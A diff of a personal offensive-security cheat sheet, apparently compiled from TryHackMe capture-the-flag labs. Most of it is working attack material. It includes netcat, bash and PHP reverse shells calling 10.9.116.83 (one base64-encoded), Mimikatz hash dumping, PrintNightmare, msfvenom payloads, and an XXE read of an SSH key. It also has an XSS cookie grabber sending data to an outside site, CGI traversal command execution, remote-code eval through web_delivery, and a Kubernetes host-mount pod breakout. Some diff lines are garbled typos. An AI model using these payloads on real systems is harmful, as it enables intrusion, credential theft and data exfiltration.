@@ -1,3 +1,5 @@
+
+
 exploit/windows/http/icecast_header
 
 post/multi/recon/local_exploit_suggester
@@ -35,6 +37,7 @@ smbclient //<ip>/anonymous
 smbget -R smb://<ip>/anonymous
 
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP
+showmount -e MACINE_IP 
 
 nc <IP> <port>  --- connect to proFtpd
 
@@ -98,8 +101,11 @@ Running the .json <drag and drop> in BloodHound -- check queries -- check Kerber
 cd Downloads && mimikaz.exe 
 
 privilege::debug --- if Privilege '20' ok --> means user is runnig with admin priv and works properly or not
-
+token::elevate 
+lsadump::sam 
 lsadump::lsa /patch --- dumping password hash NTLM 
+
+sekurlsa::logonPasswords
 
 hash -m 1000 <hash> <wordlists> ---- 
 
@@ -438,6 +444,19 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/bin/bash -c '/bin/bash -i > &/dv/tcp/10.9.116.8
 
 echo $(/bin/bash -c '/bin/bash -i >& /dev/tcp/10.9.116.83/9999 0>&1')
 
+netcat nc reverse shell 
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.116.83 9999 >/tmp/f
+
+Encode base64: 
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.116.83 9999 >/tmp/f" | base64 -w0
+
+Enter: 
+
+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuOS4xMTYuODMgOTk5OSA+L3RtcC9mCgo|base64 -d|bash
+
+Get shell:
 
 netstat -anlp | grep LISTEN
 
@@ -554,9 +573,16 @@ sending files with
 
 # sender end 
 nc -w 3 <ip> 1234 < out.file
+nc -w 3 10.9.116.83 1234 <  'Screenshot from 2021-10-26 15-41-08.png'
+
+
+
 
 # reciever end 
 nc -l -p 1234 > out.file
+nc -l -p 1234 > 'Screenshot from 2021-10-26 15-41-08.png'
+
+
 
 
 >>> import zlib
@@ -777,7 +803,7 @@ touch /home/user/--checkpoint-action=exec=shell.elf
 
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null #suid + sgid
 
-export TERM=xterm
+export TER=xMterm
 
 
 stty raw -echo; fg
@@ -956,7 +982,7 @@ use 'Linux Exploit Suggestor 2' to detect potential kernel exploit and vul
 
 
 
-<? system('wget http://10.9.116.83:8000/somefile.phtml -O /var/www/shell.php');?>
+<? system('wget http://10.9.116.83:8000/somefile.ph -O /var/www/shell.php');?>
 
 	
 
@@ -970,10 +996,13 @@ User-Agent: Mozilla/5.0 <?php system($_GET['cmd']) ?> Gecko/20100101 Firefox/78.
 /var/log/apache2/access.log
 
 
-php -r '$sock=fsockopen("10.9.116.83",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.9.116.83",443);exec("/bin/sh - i<&3 >&3 2>&3");'
 
 
+<?php system($_GET['cmd']);?>
+<?php system(/bin/bash -c '/bin/bash -i >& /dev/tcp/10.9.116.83/9999 0>&'1);?>
 bash -i >& /dev/tcp/10.9.116.83/1234 0>&1'
+bash+-i+>+/dev/tcp/10.9.116.83/9999+0>%261
 
 http://10.10.87.36/admin?user=2
 http://10.10.87.36/admin?user=2 order by <number>
@@ -1031,6 +1060,13 @@ net start filepermsvc
 ---------------------------------------------
 
 xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.174.63
+xfreerdp /v:10.10.212.30 /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
+
+. \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1 ////// sharing tmp files btw attacker and vm 
+
+Invoke-Nightmare
+
+Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
 
 
 reg query HKLM /f password /t REG_SZ /s
@@ -1562,3 +1598,323 @@ java exploit
 msfvenom java -p java/meterpreter/reverse_tcp LHOST=10.9.116.83 LPORT=9001 -f jar -o rev.jar 
 handle with meterpreter 
 PAYLOAD /java/meterpreter/reverse_tcp 
+
+
+
+xml external entity attack --- xml server side parser vulnerability xxa attack 
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data  [
+<!ENTITY file SYSTEM "file:///home/barry/.ssh/id_rsa">
+]>
+<comment>
+  <name>Joe Hamd</name>
+  <author>&file;</author>
+</comment>
+
+
+
+
+<?php
+
+	$cookie = $_GET[" c"];
+	$file = fopen('cookielog.txt', 'a');
+	fwrite($file, $cookie . "\n\n");
+	/* 
+	inject 
+	<script language="javascript"> document.location= " http://kennethzhang.net/cookiegrab.php?c=" + document.cookie; </script>
+	into vulnerable text fields
+	*/
+?> 
+
+
+dns request catcher used 10.10.10.100 
+
+</textarea><script>
+var email = document.getElementById('email').innerHTML; 
+var my_address = "a5087b991f03cd88a276a069882653d9.log.tryhackme.tech";
+var request = new XMLHttpRequest();
+request.open ("GET", "http://" + email + my_address , false ); 
+request.send();
+</script>
+
+
+
+curl -v 'http://10.10.93.102:808/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-type: text/plain;echo;cat /etc/passwd;' -H 'Content-type: text/plain' 
+
+curl -v 'http://10.10.93.102:8082/cgi-bin/.%%32%62/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+
+enca -L none file 
+
+https://onlinestringtools.com/convert-string-to-ascii
+
+
+sqsh -S 10.10.110.134 -U sa -P "t7uLKzddQzVjVFJp" 
+1>select * from reindeer.dbo.names; 
+2> go #to excecute 
+3> xp_cmdshell '<command>' 
+4> xp_cmdshell 'type C:\Users\grinch\Documents\flag.txt'; 
+5> xp_cmdshell 'dir C:\Users\grinch\Documents\'; 
+
+
+ThinVNC Directory Travesal exploit Git
+https://github.com/MuirlandOracle/CVE-2019-17662/blob/main/CVE-2019-17662.py
+
+printspooler exploit printnightmare
+
+ Windows PrintSpooler and dumping password hashes with Mimikatz.
+ windows printer vul
+ Invoke-Nightmare
+ CVE-2021-1675
+ printNightmare  
+
+
+ aoc window privi
+ net users
+ systeminfo | findstr /B /C: "OS Name"/C: "OS Version"
+ wmic service list
+
+window rev shell using iperius backup service vuln
+service path must defined using .bat file 
+@echo off   C:\Users\McSkidy\Downloads\nc.exe ATTACK_IP 1337 -e cmd.exe
+
+
+aws s3 ls s3://images.bestfestivalcompany.com  . --no-sign-request
+
+aws s3 cp s3://images.bestfestivalcompany.com/0vF39p3.png  . --no-sign-request
+
+curl http://images.bestfestivalcompany.com.s3.amazonaws.com/wp-backup.zip -o wp-backup.zip
+
+aws s3 ls --profile PROFILENAME
+
+ProTip: Never store a set of access keys in the [default] profile. Doing so forces you always to specify a profile and never accidentally run a command against an account you don't intend to. 
+
+A few other common AWS reconnaissance techniques are:
+
+    Finding the Account ID belonging to an access key:
+
+    aws sts get-access-key-info --access-key-id AKIAEXAMPLE 
+
+    Determining the Username the access key you're using belongs to
+
+    aws sts get-caller-identity --profile PROFILENAME
+
+    Listing all the EC2 instances running in an account
+
+    aws ec2 describe-instances --output text --profile PROFILENAME
+    Listing all the EC2 instances running in an account in a different region
+    aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME
+
+
+aws secretsmanager list-secrets
+
+aws secretsmanager get-secret-value --secret-id HR-Password
+arn:aws:secretsmanager:us-east-1:019181489476:secret:HR-Password-8AkWYF 2021-11-23T20:29:07.718000-05:00        HR-Password     The Secret you're looking for is not in this **REGION**. Santa wants to have low latency to his databases. Look closer to where he lives.       70630b3c-4fbe-4a24-885d-18445bd808b1
+
+
+aws secretsmanager get-secret-value --secret-id HR-Password
+
+
+aws secretsmanager --region eu-north-1  get-secret-value --secret-id HR-Password
+
+
+
+
+
+arn:aws:secretsmanager:eu-north-1:019181489476:secret:HR-Password-KIJEvK        2021-11-13T08:26:19.996000-05:00        HR-Password     Winter2021!     f806c3cd-ea20-4a1a-948f-80927f3ad366
+VERSIONSTAGES   AWSCURRENT
+
+
+
+Docker installation 
+sudo apt install apt-transport-https ca-certificates curl software-properties-common
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
+sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu `lsb_release -cs` test"
+sudo apt update
+sudo apt install docker-ce
+sudo apt  install docker.io
+
+
+$key = (New-Object System.Text.ASCIIEncoding).GetBytes("j3pn50vkw21hhurbqmxjlpmo9doiukyb")
+
+$encrypted = "76492d1116743f0423413b16050a5345MgB8AEcAVwB1AFMATwB1ADgALwA0AGQAKwBSAEYAYQBHAE8ANgBHAG0AcQBnAHcAPQA9AHwAMwBlADAAYwBmADAAYQAzAGEANgBmADkAZQA0ADUAMABiADkANgA4ADcAZgA3ADAAMQA3ADAAOABiADkAZAA2ADgAOQA2ADAANQA3AGEAZAA4AGMANQBjADIAMAA4ADYAYQA0ADMAMABkADkAMwBiADUAYQBhADIANwA5AGMAYQA1ADYAYQAzAGEAYQA2ADUAMABjADAAMwAzADYANABlADYAOAA4ADQAYwAxAGMAYwAxADkANwBiADIANAAzADMAMAAzADgAYQA5ADYANAAzADEANAA2AGUAZgBkAGEAMAA3ADcANQAyADcAZgBlADMAZQA3ADUANwAyADkAZAAwAGUAOQA5ADQAOQA1AGQAYQBkADEANQAxADYANwA2AGIAYQBjADAAMQA0AGEAOQA3ADYAYgBkAGMAOAAxAGMAZgA2ADYAOABjADEAMABmADcAZgAyADcAZgBjADEAYgA3AGYAOAA3AGIANQAyAGUAMwA4ADgAYQAxADkANgA4ADMA"
+
+echo $encrypted | ConvertTo-SecureString -key $key | ForEach-Object {[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_))}
+
+
+php webdelivery 
+metasploit
+
+mulit/script/web_delivery
+http://10.10.220.93/index.php?path=/;php%20-d%20allow_url_fopen=true%20-r%20%22eval(file_get_contents(%27http://10.9.116.83:8080/qj4KuuHemXj%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22
+
+
+usermod -aG sudo adam
+adduser adam
+
+
+SSH SOCKS PROXY, setup 
+intention of using proxychains to conduct
+my nMAP scans.
+
+ssh -D localhost:9050 -f -N adam@10.10.220.93
+proxychains nmap -A 172.16.20.6
+
+sudo ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.6
+sudo ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.3
+172.16.20.0/24
+sudo ssh -i id_rsa mike@172.16.20.6
+
+service --status-all
+wget http://10.9.116.83/linpeas.sh
+
+sudo netstat -tulpn | grep LISTEN
+
+file transfer 
+
+curl -T zeno-monitoring.service http://10.9.116.83:8000/home/dwight/tryhackme/zeno/
+nc -lvnp 8000 | tee zeno-monitoring.service
+
+
+smb login
+crackmapexec smb 10.10.182.191  -u user -p password 
+
+smb share login with impacket psexec.py
+
+confirm login by 
+
+psexec.py bob:'!P@$$W0rD!123'@relevant
+
+psexec.py USERNAME:PASSWORD@10.10.182.191
+
+
+SMB share, we can craft a reverse shell payload to connect to the machine. Knowing that IIS generally requires an aspx shell, we craft one with msfvenom. 
+
+window server 2016 so x64
+
+iss use file with .aspx extension so craft the payload with .aspx extension
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.116.83 LPORT=1234 -f aspx -o payload.aspx
+
+
+for windows reverse shell spawing 
+
+use : curl to trigger the page 
+and catch rev shell with nc
+
+whoami /priv (window) == sudo -l (linux)
+
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled (means potato attack enable)
+but DCOM is enable to prevent potato attack
+
+since we are service account which is iis apppool\defaultapppool (iss service account)
+
+we can use other service account laterally
+
+using PrintSpoofer.exe to elavate privilege with SeImpersonate privilege
+
+PrintSpoofer -i -c cmd
+
+gain root
+
+C:/inetpub/wwwroot/...1995
+
+ /[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/|  bypass echo 
+
+
+
+perl 
+ libimage-exiftool-perl
+
+ git clone http://team.thm:31111/leeroy/jenkins.git
+touch test
+git add test
+git ci -m "test"
+git push origin master
+
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.116.83 LPORT=4444 -f elf > shell
+
+kubernetes service account token finding
+
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+listing all avaiable namespaces to enumerate secret
+
+kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  get namespaces
+
+default
+kube-system
+
+
+kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 auth can-i --list
+
+RBAC is not enabled in clustered -- no result 
+
+kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 -n kube-system get secret flag3 -o json | jq -r '.data | map_values(@base64d)'
+
+
+Privilage escalation via pod breakout 
+Using service token to creat new pod in cluster
+
+PE via pod
+
+
+finding avaiable pod to reference and breakout
+
+kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  get pods
+----------------------------------------------------------------------------------
+
+PE via Docker Image
+
+finding docker available docker images in kubernet node
+
+kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 get node -o yaml
+
+
+using ngix docker image and creating yaml file 
+
+ngix docker image : docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750)
+
+
+
+yaml format 
+//
+apiVersion: v1
+kind: Pod
+metadata:
+  name: host
+spec:
+  containers:
+  - image: docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750
+    name: host
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+    volumeMounts:
+    - mountPath: /host
+      name: host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
+
+      //
+using host.yaml yaml to creat pod/host on target 
+kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 -n default apply -f host.yaml
+
+accessing newly created pod
+kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 -n default exec -it host bash
+
+
+------------------
+
+kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  get namespaces 
+kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  get pods
+kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  get nodes
+kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  get secret
+kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  -n kube-system get secret
+kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  -n kube-system get secret flag3 -o json
+
+------------------
+
